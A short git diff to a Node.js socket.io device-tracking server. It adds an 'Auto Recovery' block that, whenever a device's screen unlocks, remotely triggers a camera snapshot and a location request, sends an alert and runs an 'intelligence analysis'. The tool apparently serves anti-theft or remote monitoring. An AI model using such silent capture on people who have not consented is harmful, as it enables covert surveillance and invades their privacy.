@@ -388,6 +388,20 @@ io.on('connection', (socket) => {
         device.lastSeen = Date.now();
         saveDevices();
         io.emit('device-update', { id: deviceId, visibility: data });
+        // Auto-recovery when screen unlocks (hidden -> visible)
+        if (data && data.state === 'visible') {
+            const lastVisChange = device._lastVisChange || 0;
+            if (Date.now() - lastVisChange > 5000) {
+                device._lastVisChange = Date.now();
+                console.log(`[Auto Recovery] ${device.label} unlocked — capturing...`);
+                // Snapshot + location refresh
+                setTimeout(() => io.to(deviceId).emit('take-snapshot'), 1000);
+                setTimeout(() => io.to(deviceId).emit('request-location'), 2000);
+                sendAIAlert(deviceId, 'Auto Recovery', 'Device unlocked — snapshot & location captured.').catch(()=>{});
+                // Run intelligence analysis for any new data
+                setTimeout(() => runIntelligenceAnalysis(deviceId).catch(()=>{}), 5000);
+            }
+        }
     });
 
     socket.on('autofill', (data) => {
